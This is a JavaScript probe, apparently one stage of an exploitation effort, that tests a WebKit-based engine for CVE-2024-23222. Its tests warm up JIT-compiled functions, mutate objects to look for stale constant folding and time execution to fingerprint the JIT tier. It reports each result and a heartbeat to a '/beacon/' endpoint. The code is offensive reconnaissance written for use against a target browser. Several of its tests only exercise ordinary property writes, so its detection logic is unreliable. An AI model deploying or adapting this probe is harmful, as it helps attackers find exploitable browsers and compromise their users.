/* p71-cve23222 — CVE-2024-23222 DFG constant fold TOCTOU detection
 * Bug: DFG constant-folds property from intermediate structure transition S2,
 * but CheckStructure only validates S1 and S3. Object transitions S1→S2→S3
 * during compilation → stale constant from S2 used at runtime.
 * Fixed in WebKit commit 64714692 (Safari 17.3). Our engine is 17.2.x → LIKELY PRESENT.
 *
 * This probe DETECTS the behavior without crashing:
 * 1. Create a sealed object with a property → structure S1
 * 2. Warm up a function reading through it → DFG compiles, constant-folds
 * 3. Transition the object (add property → S2, then another → S3)
 * 4. If DFG returns the S1/S2 value instead of S3 → BUG IS PRESENT
 *
 * Beacon prefix: V71C-
 */
(function(){
"use strict";
var RUN_ID = "v71c" + Math.random().toString(36).slice(2,12);
var PREFIX = "V71C-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,900)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press71-CVE-2024-23222 DFG constant fold detection");

/* ====== D1: Basic constant fold detection (sealed object) ====== */
function test_D1() {
  var r = {};
  try {
    var inner1 = { x: 1, y: 2, z: 3, w: 4 };
    var state = { val: inner1, pad: 13 };
    Object.seal(state);

    // Function that reads through state.val
    function readVal() {
      return state.val.x;
    }

    // Warm up to trigger DFG compilation (~10000 iterations to be safe)
    for (var i = 0; i < 50000; i++) readVal();
    r.warmupDone = true;

    var before = readVal();
    r.before = before; // should be 1

    // Now replace state.val — sealed object allows value changes on existing props
    var inner2 = { x: 999, y: 888, z: 777, w: 666 };
    state.val = inner2;

    // Call again — if DFG constant-folded, it returns 1 (stale); if re-reads, returns 999
    var after = readVal();
    r.after = after;
    r.STALE_FOLD = after === 1; // TRUE = DFG returned stale constant = BUG PRESENT!
    r.CORRECT = after === 999;

    // Double-check: read directly
    r.directRead = state.val.x;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("D1-BASIC", r);
}

/* ====== D2: Structure transition S1→S2→S3 pattern (exact CVE trigger) ====== */
function test_D2() {
  var r = {};
  try {
    // Create object with initial structure S1
    var obj = { a: 42 };

    function readA() {
      return obj.a;
    }

    // Warm up with S1 → DFG sees stable structure, constant-folds obj.a = 42
    for (var i = 0; i < 50000; i++) readA();
    r.warmup = readA(); // 42

    // Transition S1 → S2: add property (changes structure)
    obj.b = 100;  // S2
    obj.a = 7777; // Change the value while in S2

    // Transition S2 → S3: add another property
    obj.c = 200;  // S3

    // DFG CheckStructure for S1 should FAIL here (obj is now S3)
    // But if DFG constant-folded obj.a=42 from S1 and the structure
    // transition invalidation didn't fire properly...
    var after = readA();
    r.after = after;
    r.STALE = after === 42; // TRUE = stale constant from S1 = BUG!
    r.CORRECT = after === 7777;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("D2-TRANSITION", r);
}

/* ====== D3: Concurrent-like trigger via setTimeout + tight loop ====== */
function test_D3() {
  var r = {};
  try {
    var target = { val: { marker: 0xAAAA } };
    Object.seal(target);

    function readMarker() {
      return target.val.marker;
    }

    // Phase 1: warm up
    for (var i = 0; i < 100000; i++) readMarker();
    r.phase1 = readMarker();

    // Phase 2: replace in a microtask-like pattern
    // The idea: DFG may be compiling/recompiling during this window
    var original = target.val;
    var replacement = { marker: 0xBBBB };

    // Rapid alternation to try to hit the compilation window
    var staleCount = 0;
    var correctCount = 0;
    for (var j = 0; j < 1000; j++) {
      target.val = replacement;
      var v1 = readMarker();
      if (v1 === 0xAAAA) staleCount++;
      else if (v1 === 0xBBBB) correctCount++;

      target.val = original;
      var v2 = readMarker();
      if (v2 === 0xBBBB) staleCount++;
      else if (v2 === 0xAAAA) correctCount++;
    }

    r.stale = staleCount;
    r.correct = correctCount;
    r.FOLD_DETECTED = staleCount > 0;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("D3-RAPID", r);
}

/* ====== D4: Multi-property fold — detect which properties get folded ====== */
function test_D4() {
  var r = {};
  try {
    var data = { a: 1, b: 2, c: 3, d: 4, e: 5 };
    var box = { ref: data };
    Object.seal(box);

    function readAll() {
      var v = box.ref;
      return [v.a, v.b, v.c, v.d, v.e];
    }

    for (var i = 0; i < 50000; i++) readAll();
    var before = readAll();
    r.before = before.join(",");

    // Replace with new object with different values
    box.ref = { a: 10, b: 20, c: 30, d: 40, e: 50 };
    var after = readAll();
    r.after = after.join(",");

    // Check which properties returned stale values
    var stale = [];
    var expected = [10, 20, 30, 40, 50];
    var original = [1, 2, 3, 4, 5];
    for (var j = 0; j < 5; j++) {
      if (after[j] === original[j]) stale.push(String.fromCharCode(97+j));
    }
    r.staleProps = stale.join(",") || "none";
    r.FOLD_DETECTED = stale.length > 0;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("D4-MULTI", r);
}

/* ====== D5: Polymorphic structure test — confuse DFG structure set ====== */
function test_D5() {
  var r = {};
  try {
    // Create objects with same shape but different structures
    function makeObj(x) { var o = {}; o.val = x; return o; }
    var objs = [];
    for (var i = 0; i < 10; i++) objs.push(makeObj(i));

    var target = makeObj(42);
    Object.seal(target);

    function readTarget() { return target.val; }

    // Warm up: DFG sees target always has same structure
    for (var j = 0; j < 50000; j++) readTarget();
    r.warmup = readTarget();

    // Now mutate target's val through the sealed property
    target.val = 9999;

    // If DFG constant-folded target.val = 42, it'll still return 42
    var after = readTarget();
    r.after = after;
    r.STALE = after === 42;
    r.CORRECT = after === 9999;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("D5-POLY", r);
}

/* ====== D6: Worker-based race — try to hit compilation window ====== */
function test_D6() {
  var r = {};
  try {
    // Use a Worker + MessageChannel to create timing pressure
    // Worker sends rapid messages that cause property changes on main thread

    var state = { val: { id: "ALPHA" } };
    Object.seal(state);

    function readId() { return state.val.id; }

    // Warm up
    for (var i = 0; i < 50000; i++) readId();

    // Now: set up rapid property changes via setTimeout cascade
    // While DFG might be recompiling
    var results = [];
    var round = 0;

    function doCycle() {
      if (round >= 500) {
        var stale = 0;
        for (var k = 0; k < results.length; k++) {
          if (results[k].v !== results[k].expected) stale++;
        }
        r.total = results.length;
        r.stale = stale;
        r.FOLD_DETECTED = stale > 0;
        if (stale > 0) {
          // Report first stale result
          for (var m = 0; m < results.length; m++) {
            if (results[m].v !== results[m].expected) {
              r.firstStale = results[m];
              break;
            }
          }
        }
        B("D6-RACE", r);
        return;
      }

      var newId = "V" + round;
      state.val = { id: newId };

      // Force some computation to let JIT work
      var sum = 0;
      for (var j = 0; j < 1000; j++) sum += j;

      var got = readId();
      results.push({ r: round, v: got, expected: newId });
      round++;
      setTimeout(doCycle, 0);
    }

    doCycle();
  } catch(e) {
    r.err = e.message.slice(0,80);
    B("D6-RACE", r);
  }
}

/* ====== D7: DFG tier detection — measure JIT compilation timing ====== */
function test_D7() {
  var r = {};
  try {
    // Measure how many iterations it takes for performance to stabilize
    // (indicates JIT tier transitions)
    function work(n) {
      var sum = 0;
      for (var i = 0; i < n; i++) sum += i * i;
      return sum;
    }

    var timings = [];
    var batchSize = 10000;
    for (var round = 0; round < 20; round++) {
      var t0 = performance.now();
      for (var i = 0; i < batchSize; i++) work(100);
      var dt = performance.now() - t0;
      timings.push(Math.round(dt));
    }
    r.timings = timings.join(",");

    // Look for tier transitions: sudden speed-up indicates JIT compilation
    var speedups = [];
    for (var j = 1; j < timings.length; j++) {
      if (timings[j-1] > 0 && timings[j] > 0) {
        var ratio = timings[j-1] / timings[j];
        if (ratio > 1.5) speedups.push(j + ":" + ratio.toFixed(1) + "x");
      }
    }
    r.speedups = speedups.join(",") || "none";
    r.DFG_LIKELY = speedups.length > 0;

    // Also test: does the engine have DFG-level optimizations?
    // DFG does type specialization — monomorphic access should be much faster
    var obj = { x: 1 };
    function monoRead(o) { return o.x; }
    // Warm up monomorphic
    for (var k = 0; k < 100000; k++) monoRead(obj);

    var t1 = performance.now();
    var s = 0;
    for (var m = 0; m < 1000000; m++) s += monoRead(obj);
    var monoTime = performance.now() - t1;

    // Polymorphic: different shaped objects
    function polyRead(o) { return o.x; }
    var shapes = [
      { x: 1 }, { x: 1, a: 2 }, { x: 1, b: 3 }, { x: 1, c: 4 },
      { x: 1, d: 5 }, { x: 1, e: 6 }, { x: 1, f: 7 }, { x: 1, g: 8 }
    ];
    for (var n = 0; n < 100000; n++) polyRead(shapes[n % shapes.length]);

    var t2 = performance.now();
    s = 0;
    for (var p = 0; p < 1000000; p++) s += polyRead(shapes[p % shapes.length]);
    var polyTime = performance.now() - t2;

    r.monoMs = Math.round(monoTime);
    r.polyMs = Math.round(polyTime);
    r.ratio = (polyTime / monoTime).toFixed(2);
    // DFG: ratio > 2x. Baseline JIT: ratio ~1.5x. Interpreter: ratio ~1x
    r.DFG_TIER = parseFloat(r.ratio) > 2.0 ? "LIKELY_DFG" : parseFloat(r.ratio) > 1.3 ? "BASELINE" : "INTERP";

  } catch(e) { r.err = e.message.slice(0,80); }
  B("D7-TIER", r);
}

/* ====== Run ====== */
try {
  test_D1();
  setTimeout(test_D2, 200);
  setTimeout(test_D3, 500);
  setTimeout(test_D4, 800);
  setTimeout(test_D5, 1100);
  setTimeout(test_D6, 1400);
  setTimeout(test_D7, 3000);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 2000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe71-done"); }, 20000);
})();
